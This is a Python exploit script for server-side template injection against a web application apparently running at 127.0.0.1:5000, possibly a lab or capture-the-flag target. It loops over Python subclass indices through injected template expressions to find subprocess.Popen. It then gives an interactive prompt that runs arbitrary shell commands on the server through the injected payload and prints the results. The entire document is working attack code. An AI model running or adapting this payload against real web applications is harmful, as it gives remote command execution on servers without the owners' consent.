import requests

url = "http://127.0.0.1:5000/"

# Try first 1000 subclasses to find Popen
for i in range(1000):
    payload = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{i}] }}}}"
    r = requests.post(url, data={"input": payload})
    if "subprocess.Popen" in r.text or "Popen" in r.text:
        print(f"[+] Found Popen at index: {i}")
        break

print()
print("[+] Boom ! Here is your shell ")

print()

popen_index = 539

while True:
      shell = input("Shell Command: ")

      payload = {
                 "input": f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{popen_index}]('{shell}', shell=True, stdout=-1).communicate() }}}}"
      }

      r = requests.post(url, data=payload)
      print("\n", r.text, "\n" )
